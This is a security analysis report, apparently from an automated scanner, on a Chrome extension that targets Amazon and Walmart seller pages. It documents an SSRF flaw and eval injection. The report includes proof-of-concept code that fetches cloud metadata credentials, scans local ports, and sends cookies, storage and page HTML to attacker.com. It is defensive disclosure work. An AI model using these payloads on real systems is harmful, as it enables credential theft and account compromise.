# CoCo Analysis: pjilhejlknnknaafmebjgohibhkcbabf

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 10 (including SSRF, eval vulnerabilities, and information disclosure)

---

## Sink 1-2: bg_chrome_runtime_MessageExternal í fetch_resource_sink + sendResponseExternal

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/pjilhejlknnknaafmebjgohibhkcbabf/opgen_generated_files/bg.js
Line 1128: `case 'sendGetRequest': js_actions.sendGetRequest(request.url, sendResponse, request.headers); break;`

**Code:**

```javascript
// Background script - External message listener (bg.js Line 1126-1138)
const messagesListener = function(request, sender, sendResponse){
    switch(request.action){
        case 'sendGetRequest': js_actions.sendGetRequest(request.url, sendResponse, request.headers); break; // ê attacker-controlled URL
        case 'sendPostRequest': js_actions.sendPostRequest(request, sendResponse); break;
        case 'getGlobalData': js_actions.getGlobalData(sendResponse); break;
        case 'checkExtension': js_actions.checkExtension(sendResponse); break;
    }
    return true;
};

chrome.runtime.onMessage.addListener(messagesListener);
chrome.runtime.onMessageExternal.addListener(messagesListener); // ê Accepts external messages

// Function that performs fetch (bg.js Line 1040-1054)
js_actions = {
    sendGetRequest: function (url, callback, headers = {}) {
        fetch(url, { // ê SSRF sink - fetches attacker-controlled URL
            method: 'GET',
            headers: headers
        })
        .then(response => response.text())
        .then(text => {
            try {
                return JSON.parse(text);
            } catch(err) {
                return text;
            }
        }).then(function(response){
            callback(response); // ê sends response back to attacker via sendResponse
        });
    }
    // ... other methods
};
```

**Manifest externally_connectable:**
```json
{
  "externally_connectable": {
    "matches": [
      "https://www.amazon.com/*",
      "https://www.amazon.ca/*",
      "https://www.amazon.co.uk/*",
      // ... many Amazon domains
      "*://sellercentral.amazon.com/*",
      // ... many sellercentral domains
      "https://www.walmart.com/*",
      "https://*.sellertoolset.com/*",
      "https://sts.mee4dy.ru/*"
    ]
  }
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External messages from allowed domains (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From any page on allowed domains (Amazon, Walmart, sellertoolset.com, etc.)

// SSRF - Fetch internal/arbitrary URLs
chrome.runtime.sendMessage('pjilhejlknnknaafmebjgohibhkcbabf', {
    action: 'sendGetRequest',
    url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' // AWS metadata
}, function(response) {
    console.log('Stolen AWS credentials:', response);
    fetch('https://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify(response)
    });
});

// SSRF - Access internal services
chrome.runtime.sendMessage('pjilhejlknnknaafmebjgohibhkcbabf', {
    action: 'sendGetRequest',
    url: 'http://localhost:8080/admin/secrets' // Internal service
}, function(response) {
    console.log('Internal data:', response);
});

// SSRF - Port scanning
for (let port = 8000; port < 8100; port++) {
    chrome.runtime.sendMessage('pjilhejlknnknaafmebjgohibhkcbabf', {
        action: 'sendGetRequest',
        url: 'http://localhost:' + port
    }, function(response) {
        if (response) console.log('Port ' + port + ' is open');
    });
}
```

**Impact:** Server-Side Request Forgery (SSRF) with response exfiltration. An attacker controlling content on allowed domains can:
1. Fetch arbitrary URLs with the extension's privileges (bypassing CORS)
2. Access internal network resources and cloud metadata services
3. Port scan internal networks
4. Exfiltrate sensitive data from internal services
5. Retrieve responses and send them to attacker-controlled servers

---

## Sink 3-4: cs_window_eventListener_message í eval_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/pjilhejlknnknaafmebjgohibhkcbabf/opgen_generated_files/cs_0.js
Line 487: `window.addEventListener("message", function(event){`
Line 489: `const message = JSON.parse(event.data);`
Line 496: `eval(message.data);`
Line 513: `const res = eval('(' + decodeURI(message.func) + ')();');`

**Code:**

```javascript
// Content script (cs_0.js Line 487-524) - Runs on Amazon/Walmart pages
window.addEventListener("message", function(event){ // ê accepts postMessage from webpage
    try {
        const message = JSON.parse(event.data); // ê attacker-controlled

        if(message.action === 'openLink') {
            chrome.tabs.create({ url: message.data }).catch(error => {
                console.error('Error opening link tab:', error);
            });
        } else if(message.action === 'eval') {
            eval(message.data); // ê DIRECT EVAL OF ATTACKER DATA
        } else if(message.action === 'evalParent') {
            try {
                (function(){
                    const data = message.data;

                    function returnRes(resData){
                        const wind = !!document.getElementById('iframe-sellertoolset') ?
                                     document.getElementById('iframe-sellertoolset').contentWindow : window;
                        wind.postMessage(JSON.stringify({
                            action: 'evalResponse',
                            data: resData,
                            hash: message.hash
                        }), "*");
                    }

                    const res = eval('(' + decodeURI(message.func) + ')();'); // ê EVAL INJECTION
                })();
            } catch (e) {
                throw e;
            }
        }
    } catch(error) {
        // error handling
    }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage from malicious content on Amazon/Walmart pages

**Attack:**

```javascript
// From any Amazon, Walmart, or sellertoolset.com page
// (e.g., via XSS, malicious ad, compromised seller account content)

// Direct code execution via 'eval' action
window.postMessage(JSON.stringify({
    action: 'eval',
    data: 'fetch("https://attacker.com/steal?cookies=" + document.cookie)'
}), '*');

// Code execution via 'evalParent' action with callback
window.postMessage(JSON.stringify({
    action: 'evalParent',
    func: encodeURI('function(){fetch("https://attacker.com/exfil",{method:"POST",body:JSON.stringify({cookies:document.cookie,localStorage:JSON.stringify(localStorage),sessionStorage:JSON.stringify(sessionStorage)})});returnRes("done");return 1;}')
}), '*');

// Steal Amazon seller credentials from Seller Central
window.postMessage(JSON.stringify({
    action: 'eval',
    data: 'fetch("https://attacker.com/steal-seller", {method: "POST", body: document.body.innerHTML})'
}), '*');
```

**Impact:** Arbitrary JavaScript code execution on Amazon, Walmart, and seller tools pages. An attacker can:
1. Execute arbitrary JavaScript in the context of Amazon/Walmart/SellerCentral
2. Steal Amazon seller account credentials and API keys
3. Access and exfiltrate seller financial data, inventory, and sales information
4. Steal customer PII from seller dashboards
5. Manipulate product listings, prices, and orders
6. Steal payment information and seller bank account details

This is particularly severe because it targets Amazon Seller Central where sellers manage their entire business operations, financial data, and customer information.

---

## Combined Impact Analysis

This extension has **multiple critical vulnerabilities** that can be chained:

1. **SSRF + Information Disclosure**: External messages í fetch arbitrary URLs í return responses to attacker
2. **Code Execution on E-commerce Platforms**: postMessage í eval on Amazon/Walmart pages
3. **Seller Account Compromise**: Code execution on Seller Central can steal business-critical data

The combination of SSRF with response exfiltration AND code execution on financial/e-commerce platforms makes this an extremely high-risk vulnerability set. An attacker compromising content on any allowed domain (through XSS, subdomain takeover, or malicious ads on Amazon/Walmart) can:
- Access internal cloud resources (AWS metadata, etc.)
- Execute arbitrary code on e-commerce platforms
- Steal seller credentials, customer data, and financial information
- Manipulate business operations and transactions
